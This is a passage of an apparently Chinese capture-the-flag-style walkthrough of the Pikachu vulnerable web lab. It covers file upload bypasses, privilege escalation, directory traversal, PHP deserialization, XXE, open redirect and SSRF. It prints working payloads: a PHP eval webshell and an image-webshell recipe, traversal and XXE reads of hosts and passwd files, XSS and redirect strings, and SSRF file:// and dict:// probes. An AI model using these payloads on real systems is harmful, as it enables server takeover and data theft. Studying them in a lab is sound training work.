+<h2 id="Unsafe-Fileupload"><a href="#Unsafe-Fileupload" class="headerlink" title="Unsafe Fileupload"></a>Unsafe Fileupload</h2><p>不安全的文件上传漏洞概述</p>
+<p>文件上传功能在 web 应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被 webshell。</p>
+<p>所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：<br>–验证文件类型、后缀名、大小;<br>–验证文件的上传方式;<br>–对文件进行一定复杂的重命名;<br>–不要暴露文件上传后的路径;<br>–等等…</p>
+<h3 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/140c7888170f91f998248cf3bfb478f2.png"></p>
+<p>本关由于是前端校验，所以可以直接右键查看网页源代码中 js 的判断逻辑</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/80f65712375c00aa198a8e84db561cfe.png"></p>
+<p>本关有两种方式进行绕过：</p>
+<p>第一种是直接使用网页插件禁用 JS 然后进行上传</p>
+<p>比如 Chrome 浏览器的<code>Quick Javascript Switcher</code>插件，关闭 JS 后</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/51b659e3527feb6f05e89d3ecc503fd7.png"></p>
+<p>点击选择文件，这里我们直接上传 php 一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[a]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f7801fe2c29c786f8140df60ec98c997.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c59356ad3ea660fa482d31ca9b1eda51.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/78c147086d5bb51bbcbf39e12e8911f7.png"></p>
+<p>然后使用蚁剑进行连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/vul/unsafeupload/uploads/a.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9a93dda51a6c6a371703af875a803cf0.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6b2d43caf2c121118059420eede8b30e.png"></p>
+<p>第二种先上传个正常的图片文件然后开启 burp 抓包修改内容和后缀完成上传，这里就不做演示了。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/74259d6191d7c1cb457f591f531b79f1.png"></p>
+<h3 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/636e9700ba038c7cfa4ed5f8b1ba2441.png"></p>
+<p>本关检测了 MIME type 文件上传类型，本关只需要将上传请求的 Conten-Type 改为图片类型即可完成上传</p>
+<p>首先上传了一张图片，可以看到 Conten-Type 为 image&#x2F;png</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0521db18a8f6ac1280f068ab10c4e68e.png"></p>
+<p>然后将该请求包发送至 Repeater 模块中 将内容修改为一句话木马，将文件后缀改为 php 然后发送请求</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fcfdb50a312c1142d60a77a169cdadb0.png"></p>
+<p>使用蚁剑进行连接</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3a4371ec16144dbc337251bacd1e7cdf.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/efc5ab0910835b339bb861e8529bd634.png"></p>
+<h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><p>PHP 中的 getimagesize() 函数是一个内置函数，用于获取图像的大小。Getimagesize() 返回结果中有文件大小和文件类型，如果用这个函数来获取类型，从而判断是否是图片的话，会存在问题。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a04e445bf9f197483b8ed6d5b47aa669.png"></p>
+<p>本关需要上图片马并且需要配合本地文件包含漏洞来进行利用</p>
+<p>图片马制作：</p>
+<p>方法 1：直接伪造头部 GIF89A</p>
+<p>方法 2：CMD：copy &#x2F;b c.png + a.php test.png Linux&#x2F;Mac：cat a.php &gt;&gt; c.png</p>
+<p>方法 3：使用 GIMP(开源的图片修改软件)，通过增加备注，写入执行命令</p>
+<p>制作成功的图片马：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/29359b531240d9981fa694bc9c571f7a.png"></p>
+<p>然后将该图片上传到服务器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">图片保存的路径：unsafeupload/uploads/2022/10/30/830731635e401cf26d1112088349.png</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/655792c606d63deae24b631f4d75733f.png"></p>
+<p>然后需要利用本地文件包含漏洞进行漏洞利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.103/vul/fileinclude/fi_local.php?filename=..\..\unsafeupload\uploads\2022\10\30\830731635e401cf26d1112088349.png&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c2b7c232f74b7e285a6348d70bd98c37.png"></p>
+<p>然后使用蚁剑进行连接</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1a3d538cfa4c6be45b15d4331a0eeabc.png"></p>
+<h2 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h2><p>如果使用 A 用户的权限去操作 B 用户的数据，A 的权限小于 B 的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。</p>
+<p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p>
+<p>因此，在在权限管理中应该遵守：  </p>
+<ol>
+<li>使用最小权限原则对用户进行赋权;  </li>
+<li>使用合理（严格）的权限校验规则;  </li>
+<li>使用后台登录态作为条件进行权限判断, 别动不动就瞎用前端传进来的条件;</li>
+</ol>
+<h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/efe03b046e3c6590d6c1f8249adb0684.png"></p>
+<p>点击右上角提示得到如下三个账号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lucy/123456</span><br><span class="line">lili/123456</span><br><span class="line">kobe/123456</span><br></pre></td></tr></table></figure>
+
+<p>登录<code>lucy</code>账号，点击查看个人信息</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c4e97143446e8cb8fffbe6c4753e58f0.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/931911ba6b53bbf160ed9a656d7bcf3a.png"></p>
+<p>此处将 url 中的 username 参数修改为<code>lili</code>，此时页面显示的个人信息就变成了该用户的信息，实现了平行越权。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.103/vul/overpermission/op1/op1_mem.php?username=lili&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6cf41d5dde45e35e5d1a245cc34f66ad.png"></p>
+<h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/9374722741f3c15e9781b351ae085870.png"></p>
+<p>根据提示得知，本关有两个用户<code>admin/123456</code>,<code>pikachu/000000</code>, 其中 admin 是超级 boss 权限</p>
+<p>首先分别登录 admin 和 pikachu 对比两个用户的权限差异，发现 admin 管理员比 pikachu 用户多了添加用户、删除用户的权限</p>
+<p>pikachu 用户登录后的界面：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fe88fe9f96a53300dcd95fcad6afc9c1.png"></p>
+<p>admin 用户登录后的界面：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3e065b19dc4c9f6a4796c7afdfb381f6.png"></p>
+<p>使用 admin 用户进行登录，访问添加用户界面，获得以下 URL，然后点击退出登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/1b4203f1e4893856742fe600c0f033f1.png"></p>
+<p>接下来使用 pikachu 用户登录系统</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/4329296d6e3b88a93b19f064de0925b0.png"></p>
+<p>登录之后直接将刚刚得到的添加用户的 URL 粘贴到地址栏进行访问，发现可以正常访问</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/345dc58c1d4439f9a83975ff218d270c.png"></p>
+<p>接下来尝试新建个账号<code>kk/123456</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d25913ee501c5d44bd63e9fcb7828ab2.png"></p>
+<p>创建成功后登录管理员账号查看用户列表，发现已经添加成功了，此处就利用了垂直越权的漏洞创建了新用户。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/090f1d28e7f76e7f2be23b48b07324fe.png"></p>
+<h2 id="…-x2F-…-x2F"><a href="#…-x2F-…-x2F" class="headerlink" title="…&#x2F;…&#x2F;"></a>…&#x2F;…&#x2F;</h2><p>在 web 功能设计中, 很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值 (比如文件名称) 传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过 “…&#x2F;” 这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。</p>
+<p>看到这里, 你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。</p>
+<p>需要区分一下的是, 如果你通过不带参数的 url（比如：<a target="_blank" rel="noopener" href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E3%80%82" title="http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。">http://xxxx/doc）列出了 doc 文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。</a> 而并不归为目录遍历漏洞。（关于敏感信息泄露你你可以在 “i can see you ABC” 中了解更多）</p>
+<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/7a5948082a04ce478f5a69bce2f8ed85.png"></p>
+<p>本关在点击 a 链接后页面回将该文件的内容显示在页面中</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5c3fe0709095a54fc82b35ecbe401e4f.png"></p>
+<p>本关我们也可以去包含 hosts 文件，如果靶场为 linux 系统则可以去包含<code>/etc/passwd、/etc/shadow</code>等文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..\..\..\..\..\..\windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2b70ed0a05e8b7682ea0736d8cc09098.png"></p>
+<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：<br>—通过访问 url 下的目录，可以直接列出目录下的文件列表;<br>—输入错误的 url 参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</p>
+<p>类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助, 甚至 “离谱” 的敏感信息泄露也会直接造成严重的损失。 因此, 在 web 应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。</p>
+<h3 id="IcanseeyourABC"><a href="#IcanseeyourABC" class="headerlink" title="IcanseeyourABC"></a>IcanseeyourABC</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/2fb84b9dd4472262046bfc19bdb37c3f.png"></p>
+<p>尝试 admin&#x2F;123456 进行登录提示账号不正确，之后审计前端代码发现注释中包含测试账号的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 测试账号:lili/123456--&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0b2bbae3f6416d6fad8a4620b8cbdcfb.png"></p>
+<p>使用测试账号进行登录，登录成功</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/87ec4796e399d0b47516a14e8bee149d.png"></p>
+<h2 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h2><p>在理解这个漏洞前, 你需要先搞清楚 php 中 serialize()，unserialize() 这两个函数。</p>
+<p><strong>序列化 serialize()</strong> 序列化说通俗点就是把一个对象变成可以传输的字符串, 比如下面是一个对象:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class S&#123;</span><br><span class="line">        public $test=&quot;pikachu&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $s=new S(); //创建一个对象</span><br><span class="line">    serialize($s); //把这个对象进行序列化</span><br><span class="line">    序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span><br><span class="line">        O:代表object</span><br><span class="line">        1:代表对象名字长度为一个字符</span><br><span class="line">        S:对象的名称</span><br><span class="line">        1:代表对象里面有一个变量</span><br><span class="line">        s:数据类型</span><br><span class="line">        4:变量名称的长度</span><br><span class="line">        test:变量名称</span><br><span class="line">        s:数据类型</span><br><span class="line">        7:变量值的长度</span><br><span class="line">        pikachu:变量值</span><br></pre></td></tr></table></figure>
+
+<p><strong>反序列化 unserialize()</strong></p>
+<p>就是把被序列化的字符串还原为对象, 然后在接下来的代码中继续使用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);</span><br><span class="line">  echo $u-&gt;test; //得到的结果为pikachu</span><br></pre></td></tr></table></figure>
+
+<p>序列化和反序列化本身没有问题, 但是如果反序列化的内容是用户可以控制的, 且后台不正当的使用了 PHP 中的魔法函数, 就会导致安全问题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line">        __construct()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">        __destruct()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">        __toString()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">        __sleep() 在对象在被序列化之前运行</span><br><span class="line"></span><br><span class="line">        __wakeup将在序列化之后立即被调用</span><br><span class="line"></span><br><span class="line">        漏洞举例:</span><br><span class="line"></span><br><span class="line">        class S&#123;</span><br><span class="line">            var $test = &quot;pikachu&quot;;</span><br><span class="line">            function __destruct()&#123;</span><br><span class="line">                echo $this-&gt;test;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $s = $_GET[&#x27;test&#x27;];</span><br><span class="line">        @$unser = unserialize($a);</span><br><span class="line"></span><br><span class="line">        payload:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP-反序列化漏洞"><a href="#PHP-反序列化漏洞" class="headerlink" title="PHP 反序列化漏洞"></a>PHP 反序列化漏洞</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/db5b1ddcaf731689626b28d7db743b20.png"></p>
+<p>分析下源代码</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3e7fe85abdec9bdfb390d06c196b5a6a.png"></p>
+<p>代码的意思是把输入的内容进行反序列化生成对象实例，然后输出对象实例的 test 这个数据成员</p>
+<p>接下来构造序列化代码，该漏洞有多种利用方式</p>
+<p>打印输出 test1234</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:8:&quot;test1234&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e772a32164717737d8fa39fa32e1e2dc.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7598a51b2284b438d9777cf1dd2a4a6a.png"></p>
+<p>输出 xss payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/58923706b7e203f394f4788170fd2554.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/45ad278f630ffa97a459372b57f2c9b0.png"></p>
+<p>实现网站恶意跳转至指定页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:64:&quot;&lt;script&gt;window.location.replace(&#x27;http://www.baidu.com&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/52dfbae0ab2d03b3733ca5ad97f4795f.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/91ace28759a398298cb18bffc86fbc2c.png"></p>
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>XXE -“xml external entity injection”</p>
+<p>既 “xml 外部实体注入漏洞”。</p>
+<p>概括一下就是 “攻击者通过向服务器注入指定的 xml 实体内容, 从而让服务器按照指定的配置进行执行, 导致问题”</p>
+<p>也就是说服务端接收和解析了来自用户端的 xml 数据, 而又没有做严格的安全控制, 从而导致 xml 外部实体注入。</p>
+<p>具体的关于 xml 实体的介绍, 网络上有很多, 自己动手先查一下。</p>
+<p>现在很多语言里面对应的解析 xml 的函数默认是禁止解析外部实体内容的, 从而也就直接避免了这个漏洞。</p>
+<p>以 PHP 为例, 在 PHP 里面解析 xml 用的是 libxml, 其在≥2.9.0 的版本中, 默认是禁止解析 xml 外部实体内容的。</p>
+<h3 id="XXE-漏洞"><a href="#XXE-漏洞" class="headerlink" title="XXE 漏洞"></a>XXE 漏洞</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/f3b871b99e383d946bbf42fae179c323.png"></p>
+<p>源代码分析</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/4002f04f39fcbd3231dc7509f4f2c3d3.png"></p>
+<p>simple_load_string() 函数，函数转换形式良好的 XML 字符串为 SimpleXMLElement 对象<br>在 PHP 里面解析 xml 用的是 libxml，其在 &gt;&#x3D;2.9.0 的版本中，默认是禁止解析 xml 外部实体内容的<br>xxe 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致攻击者可以构造一个恶意的 XML</p>
+<p>使用以下 Payload 进行测试，成功打印 test</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [&lt;!ENTITY hack &quot;test&quot;&gt;]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/715b81427b41b5aed1e921040f9be600.png"></p>
+<p>接下来使用以下 payload 读取 hosts 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[ </span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:///C:/Windows/System32/drivers/etc/hosts&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d6182c41ad4c07df07cd5f416e2acbe8.png"></p>
+<h2 id="URL-重定向"><a href="#URL-重定向" class="headerlink" title="URL 重定向"></a>URL 重定向</h2><p>不安全的 url 跳转</p>
+<p>不安全的 url 跳转问题可能发生在一切执行了 url 地址跳转的地方。</p>
+<p>如果后端采用了前端传进来的 (可能是用户传参, 或者之前预埋在前端页面的 url 地址) 参数作为了跳转的目的地, 而又没有做判断的话</p>
+<p>就可能发生 “跳错对象” 的问题。</p>
+<p>url 跳转比较直接的危害是:</p>
+<p>–&gt;钓鱼, 既攻击者使用漏洞方的域名 (比如一个比较出名的公司域名往往会让用户放心的点击) 做掩盖, 而最终跳转的确实钓鱼网站</p>
+<h3 id="不安全的-url-跳转"><a href="#不安全的-url-跳转" class="headerlink" title="不安全的 url 跳转"></a>不安全的 url 跳转</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/b097b9df2df83d30b5f2e6e045edf4c4.png"></p>
+<p>当点击 a 标签时候会进行跳转，使用 burp 进行抓包看看具体跳转的 url</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/43684c474ba4fea84af423506c9e217b.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/407a50fa8f8efc617df92aeac3c38c54.png"></p>
+<p>测试直接将此处的 url 的值改为 <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> 发送请求包查看是否会跳转，经测试发现成功跳转至百度，此处存在 url 重定向漏洞，攻击者可以将该 url 发送给受害者点击，然后进行钓鱼攻击</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/51905227bdc7a584ddfb589ab80971e8.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/57bccc8de966438ac537839fd3302229.png"></p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><strong>SSRF(Server-Side Request Forgery: 服务器端请求伪造)</strong></p>
+<p>其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>, 但又没有对目标地址做严格过滤与限制</p>
+<p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求, 并返回对该目标地址请求的数据</p>
+<p>数据流: 攻击者 —–&gt; 服务器 —-&gt; 目标地址</p>
+<p>根据后台使用的函数的不同, 对应的影响和利用方法又有不一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>
+
+<p>如果一定要通过后台服务器远程去对用户指定 (“或者预埋在前端的请求”) 的地址进行资源请求, <strong>则请做好目标地址的过滤</strong>。</p>
+<h3 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/211a50ac2a40368ccccf0729f3a7ce16.png"></p>
+<p><strong>SSRF 漏洞常用协议：</strong></p>
+<p>1）HTTP(s): 最常用到的一种协议，可以用来验证是否存在 SSRF 漏洞，探测端口以及服务。<br>2）file：本地文件传输协议，可以用来读取任意系统文件<br>3）dict: 字典服务器协议，dict 是基于查询相应的 TCP 协议，服务器监听端口 2628。在 SSRF 漏洞中可用于探测端口以及攻击内网应用<br>4）ghoper: 互联网上使用的分布型的文件搜集获取网络协议，出现在 http 协议之前。可用于攻击内网应用，可用于反弹 shell。</p>
+<p><strong>代码分析：</strong></p>
+<p>前端传进来的 url 被后台使用 curl_exec() 进行了请求, 然后将请求的结果又返回给了前端。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/aec69f582aa011f5546245559876e2b0.png"></p>
+<p>点击链接后发现页面请求了 info1.php 文件，但是没有找到</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9b9bd5e34b1ae823978fff0f9aac3a88.png"></p>
+<p>此处我们可以直接<code>file</code>协议去获取 hosts、win.ini 文件 (Windows 系统的一个基本系统配置文件)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///C:/Windows/System32/drivers/etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/15611fda2d363e1d08031e4c2a1dcc53.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/85fb99533ddbfab1d514b01d50a0e9c0.png"></p>
+<p>或者使用<code>dict</code>协议扫描内网主机开放的端口，这里探测的主机是<code>192.168.0.106</code>，在目标主机上开启 http 服务</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/aa29cbd09cf1ea1f18b386a5b9af35da.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://192.168.0.106:8000</span><br></pre></td></tr></table></figure>
+
+<p>端口不存在的时候页面显示正常</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7357b00ad734f51faa2e396a9d24abb7.png"></p>
+<p>端口存在时页面会显示错误信息 (根据差异信息判断端口是否开放)</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/eee3cd5a595c37129012ea2b4d9cc5f0.png"></p>
+<p>使用 burp 进行批量端口扫描，因为时间关系这里就只演示 8000-8100 的端口范围</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/44165164ba724704fdc28c108923df50.png"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/07db36cc66daab72af54df52bacb7dd9.png"></p>
+<p>根据返回包长度可以判断出端口是否存活</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7f3fd971fe2669620a985588b6375eab.png"></p>
+<h3 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/04a5497f0ffb0f503c27bec479efefd1.png"></p>
+<p><strong>代码分析：</strong></p>
